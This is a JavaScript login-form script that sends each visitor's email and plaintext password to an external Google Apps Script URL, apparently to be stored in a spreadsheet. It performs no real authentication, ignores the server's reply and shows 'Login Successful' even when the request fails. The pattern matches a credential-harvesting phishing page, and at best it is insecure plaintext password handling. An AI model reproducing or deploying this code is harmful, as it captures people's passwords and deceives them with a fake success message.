
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxZ3kCnd7rZsbBWTTLV1Sgf5gfxm0Kmw9WYrJ6aCZ5DGxiF21MfXZBlQCBJe3f6MO2d/exec';

  document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login-form');
    const togglePassword = document.getElementById('toggle-password');
    const submitBtn = document.querySelector('.submit-btn');

    // Toggle Password (Same)
    togglePassword.onclick = () => {
      const pwd = document.getElementById('password');
      pwd.type = pwd.type === 'password' ? 'text' : 'password';
      togglePassword.textContent = pwd.type === 'password' ? '👁️' : '🙈';
    };

    // Validation (Same)
    ['email','password'].forEach(id => document.getElementById(id).oninput = validateForm);
    function validateForm() {
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      const valid = email && password && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
      submitBtn.disabled = !valid;
      submitBtn.style.opacity = valid ? '1' : '0.6';
    }

    // ✅ UPDATED: Submit → Sheet Save → Home Redirect
    form.onsubmit = async e => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();  // Trim added
      const params = new URLSearchParams();
      params.append('email', email);
      params.append('password', document.getElementById('password').value);
      
      submitBtn.innerHTML = 'Signing In...'; 
      submitBtn.disabled = true;

      try {
        await fetch(SCRIPT_URL, { method: 'POST', body: params, mode: 'no-cors' });
        
        // Save session & Redirect Home
        localStorage.setItem('userEmail', email);
        alert('✅ Login Successful!\nRedirecting to Dashboard...');
        
        // Auto-redirect after 1.5 seconds
        setTimeout(() => {
          window.location.href = 'home.html';
        }, 1500);
        
      } catch(e) {
        // no-cors hides response but data saves
        localStorage.setItem('userEmail', email);
        alert('✅ Data saved to Sheet!\nGoing Home...');
        setTimeout(() => {
          window.location.href = 'home.html';
        }, 1500);
      }
    };
  });
